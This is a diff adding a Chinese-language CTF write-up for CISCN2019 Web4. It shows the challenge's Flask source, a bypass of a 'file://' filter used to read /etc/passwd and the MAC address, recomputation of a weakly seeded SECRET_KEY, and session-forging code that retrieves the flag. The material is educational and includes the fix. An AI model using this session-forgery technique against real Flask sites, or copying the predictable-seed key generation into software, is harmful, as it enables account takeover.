@@ -3500,6 +3500,305 @@
     <div class="md-post__meta md-meta">
       <ul class="md-meta__list">
         <li class="md-meta__item">
+          <time datetime="2026-11-01 15:20:00+00:00">2026-11-01</time></li>
+        
+          <li class="md-meta__item">
+            分类于
+            
+              <a href="../../category/python/" class="md-meta__link">Python</a>, 
+              <a href="../../category/flask/" class="md-meta__link">Flask</a>, 
+              <a href="../../category/%E5%BC%B1%E9%9A%8F%E6%9C%BA/" class="md-meta__link">弱随机</a></li>
+        
+        
+          
+          <li class="md-meta__item">
+            
+              需要 5 分钟阅读时间
+            
+          </li>
+        
+        
+      </ul>
+      
+    </div>
+  </header>
+  <div class="md-post__content md-typeset">
+    <h2 id="ciscn2019-web4-mac-secret_key"><a class="toclink" href="../../ciscn2019-web4-flask-seed/">[CISCN2019 华东南赛区] Web4 — 从 MAC 地址推回 SECRET_KEY</a></h2>
+<blockquote>
+<p><strong>题目类型</strong>：Web — Flask 源码泄露 + 伪随机数预测 + session 伪造</p>
+<p><strong>题目地址</strong>：BUUCTF / ctf2 复刻环境</p>
+<p><strong>Flag</strong>：<code>CTF2{b5ab3e88-9e2a-4217-ba5f-b92ba1c7c4ff}</code></p>
+</blockquote>
+<hr />
+<h3 id="_1"><a class="toclink" href="../../ciscn2019-web4-flask-seed/#_1">题目概述</a></h3>
+<p>进入页面只有一份跳转页，点击后自动跳到百度。</p>
+<p><strong><code>/read?url=</code> 能读 URL 指向的东西，但 <code>file://</code> 被过滤了，返回 <code>No Hack</code>。</strong></p>
+<p><strong>这题真正要做的不是"绕过过滤器读文件"，而是：读出源码 → 从源码里发现 <code>SECRET_KEY</code> 是</strong>用 MAC 地址当种子生成的伪随机数** → 读出 MAC → 本地算出密钥 → 伪造 session → 访问 <code>/flag</code>。**</p>
+<hr />
+<h3 id="_2"><a class="toclink" href="../../ciscn2019-web4-flask-seed/#_2">解题过程</a></h3>
+<h4 id="step-1"><a class="toclink" href="../../ciscn2019-web4-flask-seed/#step-1">Step 1：先试能不能读文件</a></h4>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-54-1"><a id="__codelineno-54-1" name="__codelineno-54-1" href="#__codelineno-54-1"></a>/read?url=file:///etc/passwd   →  No Hack
+</span></code></pre></div>
+<p><strong>说明它拦了 <code>file</code>。</strong>先别急着绕，把这题的源码拿到手更值。</p>
+<h4 id="step-2-jwt"><a class="toclink" href="../../ciscn2019-web4-flask-seed/#step-2-jwt">Step 2：我一开始以为是 JWT（错了）</a></h4>
+<p><strong>看到 session cookie 是三段、点分隔，我第一反应是「这是 JWT」。</strong></p>
+<p><strong>这个判断是错的，而且会把人带偏——因为伪造 JWT 和伪造 Flask session 用的工具完全不同。</strong></p>
+<p><strong>正确的判断方法：把第一段 base64 解开看是什么。</strong></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-55-1"><a id="__codelineno-55-1" name="__codelineno-55-1" href="#__codelineno-55-1"></a>Flask session 的第一段   →  直接是 {"username": ...} 这样的 JSON 数据
+</span><span id="__span-55-2"><a id="__codelineno-55-2" name="__codelineno-55-2" href="#__codelineno-55-2"></a>JWT 的第一段             →  是 {"alg":"HS256","typ":"JWT"} 这样的 header
+</span></code></pre></div>
+<p><strong>Flask session 用的是 <code>itsdangerous</code>：<code>base64(数据).时间戳.HMAC-SHA1签名</code>，密钥就是 <code>SECRET_KEY</code>。长得像 JWT，但完全是两套东西。</strong></p>
+<h4 id="step-3"><a class="toclink" href="../../ciscn2019-web4-flask-seed/#step-3">Step 3：拿到源码</a></h4>
+<p><img alt="源码" src="../../../assets/images/ciscn2019-web4/01-source.png" /></p>
+<div class="language-python highlight"><pre><span></span><code><span id="__span-56-1"><a id="__codelineno-56-1" name="__codelineno-56-1" href="#__codelineno-56-1"></a><span class="kn">import</span><span class="w"> </span><span class="nn">re</span><span class="o">,</span><span class="w"> </span><span class="nn">random</span><span class="o">,</span><span class="w"> </span><span class="nn">uuid</span><span class="o">,</span><span class="w"> </span><span class="nn">urllib</span>
+</span><span id="__span-56-2"><a id="__codelineno-56-2" name="__codelineno-56-2" href="#__codelineno-56-2"></a><span class="kn">from</span><span class="w"> </span><span class="nn">flask</span><span class="w"> </span><span class="kn">import</span> <span class="n">Flask</span><span class="p">,</span> <span class="n">session</span><span class="p">,</span> <span class="n">request</span>
+</span><span id="__span-56-3"><a id="__codelineno-56-3" name="__codelineno-56-3" href="#__codelineno-56-3"></a>
+</span><span id="__span-56-4"><a id="__codelineno-56-4" name="__codelineno-56-4" href="#__codelineno-56-4"></a><span class="n">app</span> <span class="o">=</span> <span class="n">Flask</span><span class="p">(</span><span class="vm">__name__</span><span class="p">)</span>
+</span><span id="__span-56-5"><a id="__codelineno-56-5" name="__codelineno-56-5" href="#__codelineno-56-5"></a><span class="n">random</span><span class="o">.</span><span class="n">seed</span><span class="p">(</span><span class="n">uuid</span><span class="o">.</span><span class="n">getnode</span><span class="p">())</span>                          <span class="c1"># ← 关键</span>
+</span><span id="__span-56-6"><a id="__codelineno-56-6" name="__codelineno-56-6" href="#__codelineno-56-6"></a><span class="n">app</span><span class="o">.</span><span class="n">config</span><span class="p">[</span><span class="s1">'SECRET_KEY'</span><span class="p">]</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="n">random</span><span class="o">.</span><span class="n">random</span><span class="p">()</span><span class="o">*</span><span class="mi">233</span><span class="p">)</span>  <span class="c1"># ← 关键</span>
+</span><span id="__span-56-7"><a id="__codelineno-56-7" name="__codelineno-56-7" href="#__codelineno-56-7"></a><span class="n">app</span><span class="o">.</span><span class="n">debug</span> <span class="o">=</span> <span class="kc">True</span>
+</span><span id="__span-56-8"><a id="__codelineno-56-8" name="__codelineno-56-8" href="#__codelineno-56-8"></a>
+</span><span id="__span-56-9"><a id="__codelineno-56-9" name="__codelineno-56-9" href="#__codelineno-56-9"></a><span class="nd">@app</span><span class="o">.</span><span class="n">route</span><span class="p">(</span><span class="s1">'/'</span><span class="p">)</span>
+</span><span id="__span-56-10"><a id="__codelineno-56-10" name="__codelineno-56-10" href="#__codelineno-56-10"></a><span class="k">def</span><span class="w"> </span><span class="nf">index</span><span class="p">():</span>
+</span><span id="__span-56-11"><a id="__codelineno-56-11" name="__codelineno-56-11" href="#__codelineno-56-11"></a>    <span class="n">session</span><span class="p">[</span><span class="s1">'username'</span><span class="p">]</span> <span class="o">=</span> <span class="s1">'www-data'</span>
+</span><span id="__span-56-12"><a id="__codelineno-56-12" name="__codelineno-56-12" href="#__codelineno-56-12"></a>    <span class="k">return</span> <span class="s1">'Hello World! Read somethings'</span>
+</span><span id="__span-56-13"><a id="__codelineno-56-13" name="__codelineno-56-13" href="#__codelineno-56-13"></a>
+</span><span id="__span-56-14"><a id="__codelineno-56-14" name="__codelineno-56-14" href="#__codelineno-56-14"></a><span class="nd">@app</span><span class="o">.</span><span class="n">route</span><span class="p">(</span><span class="s1">'/read'</span><span class="p">)</span>
+</span><span id="__span-56-15"><a id="__codelineno-56-15" name="__codelineno-56-15" href="#__codelineno-56-15"></a><span class="k">def</span><span class="w"> </span><span class="nf">read</span><span class="p">():</span>
+</span><span id="__span-56-16"><a id="__codelineno-56-16" name="__codelineno-56-16" href="#__codelineno-56-16"></a>    <span class="k">try</span><span class="p">:</span>
+</span><span id="__span-56-17"><a id="__codelineno-56-17" name="__codelineno-56-17" href="#__codelineno-56-17"></a>        <span class="n">url</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">'url'</span><span class="p">)</span>
+</span><span id="__span-56-18"><a id="__codelineno-56-18" name="__codelineno-56-18" href="#__codelineno-56-18"></a>        <span class="n">m</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">findall</span><span class="p">(</span><span class="s1">'^file.*'</span><span class="p">,</span> <span class="n">url</span><span class="p">,</span> <span class="n">re</span><span class="o">.</span><span class="n">IGNORECASE</span><span class="p">)</span>
+</span><span id="__span-56-19"><a id="__codelineno-56-19" name="__codelineno-56-19" href="#__codelineno-56-19"></a>        <span class="n">n</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">findall</span><span class="p">(</span><span class="s1">'flag'</span><span class="p">,</span> <span class="n">url</span><span class="p">,</span> <span class="n">re</span><span class="o">.</span><span class="n">IGNORECASE</span><span class="p">)</span>
+</span><span id="__span-56-20"><a id="__codelineno-56-20" name="__codelineno-56-20" href="#__codelineno-56-20"></a>        <span class="k">if</span> <span class="n">m</span> <span class="ow">or</span> <span class="n">n</span><span class="p">:</span>
+</span><span id="__span-56-21"><a id="__codelineno-56-21" name="__codelineno-56-21" href="#__codelineno-56-21"></a>            <span class="k">return</span> <span class="s1">'No Hack'</span>
+</span><span id="__span-56-22"><a id="__codelineno-56-22" name="__codelineno-56-22" href="#__codelineno-56-22"></a>        <span class="n">res</span> <span class="o">=</span> <span class="n">urllib</span><span class="o">.</span><span class="n">urlopen</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>
+</span><span id="__span-56-23"><a id="__codelineno-56-23" name="__codelineno-56-23" href="#__codelineno-56-23"></a>        <span class="k">return</span> <span class="n">res</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
+</span><span id="__span-56-24"><a id="__codelineno-56-24" name="__codelineno-56-24" href="#__codelineno-56-24"></a>    <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">ex</span><span class="p">:</span>
+</span><span id="__span-56-25"><a id="__codelineno-56-25" name="__codelineno-56-25" href="#__codelineno-56-25"></a>        <span class="nb">print</span> <span class="nb">str</span><span class="p">(</span><span class="n">ex</span><span class="p">)</span>
+</span><span id="__span-56-26"><a id="__codelineno-56-26" name="__codelineno-56-26" href="#__codelineno-56-26"></a>        <span class="k">return</span> <span class="s1">'no response'</span>
+</span><span id="__span-56-27"><a id="__codelineno-56-27" name="__codelineno-56-27" href="#__codelineno-56-27"></a>
+</span><span id="__span-56-28"><a id="__codelineno-56-28" name="__codelineno-56-28" href="#__codelineno-56-28"></a><span class="nd">@app</span><span class="o">.</span><span class="n">route</span><span class="p">(</span><span class="s1">'/flag'</span><span class="p">)</span>
+</span><span id="__span-56-29"><a id="__codelineno-56-29" name="__codelineno-56-29" href="#__codelineno-56-29"></a><span class="k">def</span><span class="w"> </span><span class="nf">flag</span><span class="p">():</span>
+</span><span id="__span-56-30"><a id="__codelineno-56-30" name="__codelineno-56-30" href="#__codelineno-56-30"></a>    <span class="k">if</span> <span class="n">session</span> <span class="ow">and</span> <span class="n">session</span><span class="p">[</span><span class="s1">'username'</span><span class="p">]</span> <span class="o">==</span> <span class="s1">'fuck'</span><span class="p">:</span>
+</span><span id="__span-56-31"><a id="__codelineno-56-31" name="__codelineno-56-31" href="#__codelineno-56-31"></a>        <span class="k">return</span> <span class="nb">open</span><span class="p">(</span><span class="s1">'/flag.txt'</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
+</span><span id="__span-56-32"><a id="__codelineno-56-32" name="__codelineno-56-32" href="#__codelineno-56-32"></a>    <span class="k">else</span><span class="p">:</span>
+</span><span id="__span-56-33"><a id="__codelineno-56-33" name="__codelineno-56-33" href="#__codelineno-56-33"></a>        <span class="k">return</span> <span class="s1">'Access denied'</span>
+</span></code></pre></div>
+<p><img alt="seed 与密钥" src="../../../assets/images/ciscn2019-web4/02-seed-key.png" /></p>
+<p><strong>看到两行就够了：</strong></p>
+<div class="language-python highlight"><pre><span></span><code><span id="__span-57-1"><a id="__codelineno-57-1" name="__codelineno-57-1" href="#__codelineno-57-1"></a><span class="n">random</span><span class="o">.</span><span class="n">seed</span><span class="p">(</span><span class="n">uuid</span><span class="o">.</span><span class="n">getnode</span><span class="p">())</span>                          <span class="c1"># 种子是 MAC 地址</span>
+</span><span id="__span-57-2"><a id="__codelineno-57-2" name="__codelineno-57-2" href="#__codelineno-57-2"></a><span class="n">app</span><span class="o">.</span><span class="n">config</span><span class="p">[</span><span class="s1">'SECRET_KEY'</span><span class="p">]</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="n">random</span><span class="o">.</span><span class="n">random</span><span class="p">()</span><span class="o">*</span><span class="mi">233</span><span class="p">)</span>  <span class="c1"># 密钥由种子推出来</span>
+</span></code></pre></div>
+<p><strong>伪随机数的致命点：</strong>种子固定 → 序列固定 → 结果可复现。<strong>所以只要知道 MAC，密钥就能算出来。</strong></p>
+<h4 id="step-4file"><a class="toclink" href="../../ciscn2019-web4-flask-seed/#step-4file">Step 4：<code>file</code> 是怎么绕过的</a></h4>
+<p><strong>过滤是这一行：</strong></p>
+<div class="language-python highlight"><pre><span></span><code><span id="__span-58-1"><a id="__codelineno-58-1" name="__codelineno-58-1" href="#__codelineno-58-1"></a><span class="n">m</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">findall</span><span class="p">(</span><span class="s1">'^file.*'</span><span class="p">,</span> <span class="n">url</span><span class="p">,</span> <span class="n">re</span><span class="o">.</span><span class="n">IGNORECASE</span><span class="p">)</span>
+</span></code></pre></div>
+<p><strong>注意 <code>^</code> —— 它锚定字符串的开头。所以它拦的是"</strong>以 file 开头<strong>的字符串"，不是"含 file 的字符串"。</strong></p>
+<p><strong>而 <code>urllib.urlopen()</code> 在真正解析之前会先 <code>unwrap()</code>，那个函数里有 <code>strip()</code>——把</strong>首尾空白<strong>去掉，还会剥掉外面包的 <code>&lt;&gt;</code>。</strong></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-59-1"><a id="__codelineno-59-1" name="__codelineno-59-1" href="#__codelineno-59-1"></a>正则看到的：  原始字符串（不以 file 开头 → 不拦）
+</span><span id="__span-59-2"><a id="__codelineno-59-2" name="__codelineno-59-2" href="#__codelineno-59-2"></a>urllib 看到的：strip 之后的字符串（以 file 开头 → 正常按文件读）
+</span></code></pre></div>
+<p><strong>两个组件对同一份输入的处理不一致，绕过点就在这里。</strong></p>
+<p><strong>另外还要注意 <code>n = re.findall('flag', url)</code>：URL 里任何位置出现 <code>flag</code> 都不行，所以读 MAC 只能用 <code>/sys/class/net/eth0/address</code> 这种路径。</strong></p>
+<h4 id="step-5-mac"><a class="toclink" href="../../ciscn2019-web4-flask-seed/#step-5-mac">Step 5：读 MAC 地址</a></h4>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-60-1"><a id="__codelineno-60-1" name="__codelineno-60-1" href="#__codelineno-60-1"></a>/sys/class/net/eth0/address   →  16:49:e9:36:04:ea（举例）
+</span></code></pre></div>
+<p><strong><code>uuid.getnode()</code> 返回的就是这块网卡的 MAC，转成整数。</strong></p>
+<h4 id="step-6-secret_key"><a class="toclink" href="../../ciscn2019-web4-flask-seed/#step-6-secret_key">Step 6：本地算 SECRET_KEY</a></h4>
+<p><strong>公式：</strong></p>
+<div class="language-python highlight"><pre><span></span><code><span id="__span-61-1"><a id="__codelineno-61-1" name="__codelineno-61-1" href="#__codelineno-61-1"></a><span class="kn">import</span><span class="w"> </span><span class="nn">random</span>
+</span><span id="__span-61-2"><a id="__codelineno-61-2" name="__codelineno-61-2" href="#__codelineno-61-2"></a><span class="n">random</span><span class="o">.</span><span class="n">seed</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="s1">'1649e93604ea'</span><span class="p">,</span> <span class="mi">16</span><span class="p">))</span>
+</span><span id="__span-61-3"><a id="__codelineno-61-3" name="__codelineno-61-3" href="#__codelineno-61-3"></a><span class="n">app</span><span class="o">.</span><span class="n">config</span><span class="p">[</span><span class="s1">'SECRET_KEY'</span><span class="p">]</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="n">random</span><span class="o">.</span><span class="n">random</span><span class="p">()</span> <span class="o">*</span> <span class="mi">233</span><span class="p">)</span>
+</span></code></pre></div>
+<p><strong>⚠️ 这里有个大坑：必须按 <strong>Python 2</strong> 的 <code>str()</code> 行为算。</strong></p>
+<p><img alt="Python 2 计算" src="../../../assets/images/ciscn2019-web4/03-python2-calc.png" /></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-62-1"><a id="__codelineno-62-1" name="__codelineno-62-1" href="#__codelineno-62-1"></a>random()*233 的完整浮点 :  34.58290138764246
+</span><span id="__span-62-2"><a id="__codelineno-62-2" name="__codelineno-62-2" href="#__codelineno-62-2"></a>
+</span><span id="__span-62-3"><a id="__codelineno-62-3" name="__codelineno-62-3" href="#__codelineno-62-3"></a>Python 3 的 str()       :  34.58290138764246     ← 17 位
+</span><span id="__span-62-4"><a id="__codelineno-62-4" name="__codelineno-62-4" href="#__codelineno-62-4"></a>Python 2 的 str()       :  34.5829013876         ← 12 位（%.12g）
+</span></code></pre></div>
+<p><strong>Python 2 的 <code>str(float)</code> 等价于 <code>%.12g</code>，只保留 12 位有效数字。这题跑在 Python 2.7（<code>print str(ex)</code> 那个写法就是标志），所以密钥是</strong>短的那个<strong>。</strong></p>
+<p><strong>用 Python 3 的 <code>str()</code> 算出来去签名，会一直验不过——而且报错只说"签名不匹配"，不会告诉你差在六个字符上。</strong></p>
+<p><strong>在 Python 3 里复现 Python 2 的写法：</strong></p>
+<div class="language-python highlight"><pre><span></span><code><span id="__span-63-1"><a id="__codelineno-63-1" name="__codelineno-63-1" href="#__codelineno-63-1"></a><span class="n">key</span> <span class="o">=</span> <span class="s1">'</span><span class="si">%.12g</span><span class="s1">'</span> <span class="o">%</span> <span class="p">(</span><span class="n">random</span><span class="o">.</span><span class="n">random</span><span class="p">()</span> <span class="o">*</span> <span class="mi">233</span><span class="p">)</span>      <span class="c1"># → '34.5829013876'</span>
+</span></code></pre></div>
+<h4 id="step-7-session"><a class="toclink" href="../../ciscn2019-web4-flask-seed/#step-7-session">Step 7：伪造 session</a></h4>
+<p><strong>flask-unsign 有两个坑，我都踩了：</strong></p>
+<p><strong>① 模块名是下划线</strong></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-64-1"><a id="__codelineno-64-1" name="__codelineno-64-1" href="#__codelineno-64-1"></a>python -m flask_unsign     ✓
+</span><span id="__span-64-2"><a id="__codelineno-64-2" name="__codelineno-64-2" href="#__codelineno-64-2"></a>python -m flask-unsign     ✗ No module named flask-unsign
+</span></code></pre></div>
+<p><strong>② 它会把密钥当 Python 字面量解析</strong></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-65-1"><a id="__codelineno-65-1" name="__codelineno-65-1" href="#__codelineno-65-1"></a>--secret '34.5829013876'   →  literal_eval → 浮点数
+</span><span id="__span-65-2"><a id="__codelineno-65-2" name="__codelineno-65-2" href="#__codelineno-65-2"></a>                              → 报 "Secret must be a string-type"
+</span></code></pre></div>
+<p><strong>加 <code>--no-literal-eval</code> 能解决这个——</strong>但它同时对 <code>--cookie</code> 生效<strong>，于是 <code>{"username":"fuck"}</code> 被当成一个</strong>字符串<strong>塞进 JSON。</strong></p>
+<p><strong>结果就是 Flask 拿到的是一个字符串而不是 dict：</strong></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-66-1"><a id="__codelineno-66-1" name="__codelineno-66-1" href="#__codelineno-66-1"></a>ValueError: dictionary update sequence element #0 has length 1; 2 is required
+</span></code></pre></div>
+<p><strong>这个报错其实是</strong>好消息<strong>——它说明签名验过了（签名错的话 Flask 会静默给你空 session），只是 payload 形状不对。</strong></p>
+<p><strong>最后改成直接用 Flask 自己的签名器，避开命令行参数的口径问题：</strong></p>
+<div class="language-python highlight"><pre><span></span><code><span id="__span-67-1"><a id="__codelineno-67-1" name="__codelineno-67-1" href="#__codelineno-67-1"></a><span class="kn">from</span><span class="w"> </span><span class="nn">flask.sessions</span><span class="w"> </span><span class="kn">import</span> <span class="n">SecureCookieSessionInterface</span>
+</span><span id="__span-67-2"><a id="__codelineno-67-2" name="__codelineno-67-2" href="#__codelineno-67-2"></a>
+</span><span id="__span-67-3"><a id="__codelineno-67-3" name="__codelineno-67-3" href="#__codelineno-67-3"></a><span class="k">class</span><span class="w"> </span><span class="nc">FakeApp</span><span class="p">:</span>
+</span><span id="__span-67-4"><a id="__codelineno-67-4" name="__codelineno-67-4" href="#__codelineno-67-4"></a>    <span class="k">def</span><span class="w"> </span><span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">key</span><span class="p">):</span>
+</span><span id="__span-67-5"><a id="__codelineno-67-5" name="__codelineno-67-5" href="#__codelineno-67-5"></a>        <span class="bp">self</span><span class="o">.</span><span class="n">secret_key</span> <span class="o">=</span> <span class="n">key</span>
+</span><span id="__span-67-6"><a id="__codelineno-67-6" name="__codelineno-67-6" href="#__codelineno-67-6"></a>        <span class="bp">self</span><span class="o">.</span><span class="n">config</span> <span class="o">=</span> <span class="p">{</span><span class="s2">"SECRET_KEY_FALLBACKS"</span><span class="p">:</span> <span class="kc">None</span><span class="p">}</span>   <span class="c1"># Flask 3 会读这个</span>
+</span><span id="__span-67-7"><a id="__codelineno-67-7" name="__codelineno-67-7" href="#__codelineno-67-7"></a>
+</span><span id="__span-67-8"><a id="__codelineno-67-8" name="__codelineno-67-8" href="#__codelineno-67-8"></a><span class="n">si</span> <span class="o">=</span> <span class="n">SecureCookieSessionInterface</span><span class="p">()</span>
+</span><span id="__span-67-9"><a id="__codelineno-67-9" name="__codelineno-67-9" href="#__codelineno-67-9"></a><span class="n">signer</span> <span class="o">=</span> <span class="n">si</span><span class="o">.</span><span class="n">get_signing_serializer</span><span class="p">(</span><span class="n">FakeApp</span><span class="p">(</span><span class="s2">"34.5829013876"</span><span class="p">))</span>
+</span><span id="__span-67-10"><a id="__codelineno-67-10" name="__codelineno-67-10" href="#__codelineno-67-10"></a><span class="nb">print</span><span class="p">(</span><span class="n">signer</span><span class="o">.</span><span class="n">dumps</span><span class="p">({</span><span class="s2">"username"</span><span class="p">:</span> <span class="s2">"fuck"</span><span class="p">}))</span>
+</span></code></pre></div>
+<p><strong>这样序列化格式（TaggedJSON + 必要时 zlib 压缩）跟目标一定对得上。</strong></p>
+<h4 id="step-8-flag"><a class="toclink" href="../../ciscn2019-web4-flask-seed/#step-8-flag">Step 8：拿 flag</a></h4>
+<p><strong>把签好的 cookie 设成 <code>session</code>，访问 <code>/flag</code>。</strong></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-68-1"><a id="__codelineno-68-1" name="__codelineno-68-1" href="#__codelineno-68-1"></a>CTF2{b5ab3e88-9e2a-4217-ba5f-b92ba1c7c4ff}
+</span></code></pre></div>
+<hr />
+<h3 id="_3"><a class="toclink" href="../../ciscn2019-web4-flask-seed/#_3">解题思路总结</a></h3>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-69-1"><a id="__codelineno-69-1" name="__codelineno-69-1" href="#__codelineno-69-1"></a>跳转页 → /read?url= 能读东西，但 file:// 被拦（No Hack）
+</span><span id="__span-69-2"><a id="__codelineno-69-2" name="__codelineno-69-2" href="#__codelineno-69-2"></a>  → 绕过过滤器读源码（正则锚定开头 + urllib 会 strip，两边不一致）
+</span><span id="__span-69-3"><a id="__codelineno-69-3" name="__codelineno-69-3" href="#__codelineno-69-3"></a>    → 源码里发现 random.seed(uuid.getnode())
+</span><span id="__span-69-4"><a id="__codelineno-69-4" name="__codelineno-69-4" href="#__codelineno-69-4"></a>      → SECRET_KEY = str(random.random()*233)
+</span><span id="__span-69-5"><a id="__codelineno-69-5" name="__codelineno-69-5" href="#__codelineno-69-5"></a>        → 读 /sys/class/net/eth0/address 拿 MAC
+</span><span id="__span-69-6"><a id="__codelineno-69-6" name="__codelineno-69-6" href="#__codelineno-69-6"></a>          → 本地按 Python 2 的 str() 语义算出密钥
+</span><span id="__span-69-7"><a id="__codelineno-69-7" name="__codelineno-69-7" href="#__codelineno-69-7"></a>            → Flask 签名器签 {"username":"fuck"}
+</span><span id="__span-69-8"><a id="__codelineno-69-8" name="__codelineno-69-8" href="#__codelineno-69-8"></a>              → 访问 /flag
+</span></code></pre></div>
+<h4 id="_4"><a class="toclink" href="../../ciscn2019-web4-flask-seed/#_4">漏洞原理</a></h4>
+<p><strong>① 伪随机数用"可预测的东西"当种子，等于没随机</strong></p>
+<p><code>random.seed(uuid.getnode())</code> —— 种子是 MAC 地址。MAC 不是秘密，读得到。<strong>知道种子就等于知道全部输出。</strong>这就是为什么密钥生成不能用 <code>random</code>，得用 <code>os.urandom</code> / <code>secrets</code>。</p>
+<p><strong>② 过滤器与解析器对同一份输入处理不一致</strong></p>
+<p>正则看原始字符串（<code>^file</code> 要求开头就是 file），<code>urllib</code> 看 <code>strip()</code> 之后的字符串。<strong>这个差值就是绕过空间，和 SQL 注入里"过滤器和数据库对同一串的理解不同"是同一类问题。</strong></p>
+<p><strong>③ 语言版本差异会改变输出的字符串</strong></p>
+<p><code>str(float)</code> 在 Python 2 和 3 里给的东西不一样。<strong>跨语言/跨版本复现逻辑时，这类差异最难查，因为逻辑完全正确，只有格式不同。</strong></p>
+<h4 id="_5"><a class="toclink" href="../../ciscn2019-web4-flask-seed/#_5">关键知识点</a></h4>
+<table>
+<thead>
+<tr>
+<th>知识点</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Flask session ≠ JWT</td>
+<td>第一段解出 JSON 数据的是 Flask session；解出 <code>{"alg":...}</code> 的才是 JWT</td>
+</tr>
+<tr>
+<td><code>itsdangerous</code></td>
+<td>Flask session 的签名库，HMAC-SHA1 + <code>SECRET_KEY</code></td>
+</tr>
+<tr>
+<td><code>random.seed(int)</code></td>
+<td>种子相同则序列相同，可完全复现</td>
+</tr>
+<tr>
+<td><code>uuid.getnode()</code></td>
+<td>返回网卡 MAC 的整数值</td>
+</tr>
+<tr>
+<td><code>str(float)</code> 版本差异</td>
+<td>Python 2 ≈ <code>%.12g</code>（12 位有效数字），Python 3 是 17 位</td>
+</tr>
+<tr>
+<td><code>re.findall('^file.*', url)</code></td>
+<td><code>^</code> 锚定开头，只拦"以 file 开头"</td>
+</tr>
+<tr>
+<td><code>urllib.unwrap()</code></td>
+<td>内部会 <code>strip()</code> 首尾空白、剥掉 <code>&lt;&gt;</code></td>
+</tr>
+<tr>
+<td><code>flask-unsign</code> 的 literal_eval</td>
+<td>会把看起来像数字的密钥当浮点；<code>--no-literal-eval</code> 是全局开关</td>
+</tr>
+<tr>
+<td><code>ValueError: dictionary update...</code></td>
+<td>出现在 session 解签成功但 payload 不是 dict 时——<strong>说明密钥对了</strong></td>
+</tr>
+<tr>
+<td><code>SecureCookieSessionInterface</code></td>
+<td>直接用它签名，格式一定跟 Flask 一致</td>
+</tr>
+</tbody>
+</table>
+<hr />
+<details class="note">
+<summary>完整源码（截图整理，压缩成可读格式）</summary>
+<div class="language-python highlight"><pre><span></span><code><span id="__span-70-1"><a id="__codelineno-70-1" name="__codelineno-70-1" href="#__codelineno-70-1"></a><span class="c1"># encoding:utf-8</span>
+</span><span id="__span-70-2"><a id="__codelineno-70-2" name="__codelineno-70-2" href="#__codelineno-70-2"></a><span class="kn">import</span><span class="w"> </span><span class="nn">re</span><span class="o">,</span><span class="w"> </span><span class="nn">random</span><span class="o">,</span><span class="w"> </span><span class="nn">uuid</span><span class="o">,</span><span class="w"> </span><span class="nn">urllib</span>
+</span><span id="__span-70-3"><a id="__codelineno-70-3" name="__codelineno-70-3" href="#__codelineno-70-3"></a><span class="kn">from</span><span class="w"> </span><span class="nn">flask</span><span class="w"> </span><span class="kn">import</span> <span class="n">Flask</span><span class="p">,</span> <span class="n">session</span><span class="p">,</span> <span class="n">request</span>
+</span><span id="__span-70-4"><a id="__codelineno-70-4" name="__codelineno-70-4" href="#__codelineno-70-4"></a>
+</span><span id="__span-70-5"><a id="__codelineno-70-5" name="__codelineno-70-5" href="#__codelineno-70-5"></a><span class="n">app</span> <span class="o">=</span> <span class="n">Flask</span><span class="p">(</span><span class="vm">__name__</span><span class="p">)</span>
+</span><span id="__span-70-6"><a id="__codelineno-70-6" name="__codelineno-70-6" href="#__codelineno-70-6"></a><span class="n">random</span><span class="o">.</span><span class="n">seed</span><span class="p">(</span><span class="n">uuid</span><span class="o">.</span><span class="n">getnode</span><span class="p">())</span>
+</span><span id="__span-70-7"><a id="__codelineno-70-7" name="__codelineno-70-7" href="#__codelineno-70-7"></a><span class="n">app</span><span class="o">.</span><span class="n">config</span><span class="p">[</span><span class="s1">'SECRET_KEY'</span><span class="p">]</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="n">random</span><span class="o">.</span><span class="n">random</span><span class="p">()</span><span class="o">*</span><span class="mi">233</span><span class="p">)</span>
+</span><span id="__span-70-8"><a id="__codelineno-70-8" name="__codelineno-70-8" href="#__codelineno-70-8"></a><span class="n">app</span><span class="o">.</span><span class="n">debug</span> <span class="o">=</span> <span class="kc">True</span>
+</span><span id="__span-70-9"><a id="__codelineno-70-9" name="__codelineno-70-9" href="#__codelineno-70-9"></a>
+</span><span id="__span-70-10"><a id="__codelineno-70-10" name="__codelineno-70-10" href="#__codelineno-70-10"></a><span class="nd">@app</span><span class="o">.</span><span class="n">route</span><span class="p">(</span><span class="s1">'/'</span><span class="p">)</span>
+</span><span id="__span-70-11"><a id="__codelineno-70-11" name="__codelineno-70-11" href="#__codelineno-70-11"></a><span class="k">def</span><span class="w"> </span><span class="nf">index</span><span class="p">():</span>
+</span><span id="__span-70-12"><a id="__codelineno-70-12" name="__codelineno-70-12" href="#__codelineno-70-12"></a>    <span class="n">session</span><span class="p">[</span><span class="s1">'username'</span><span class="p">]</span> <span class="o">=</span> <span class="s1">'www-data'</span>
+</span><span id="__span-70-13"><a id="__codelineno-70-13" name="__codelineno-70-13" href="#__codelineno-70-13"></a>    <span class="k">return</span> <span class="s1">'Hello World! Read somethings'</span>
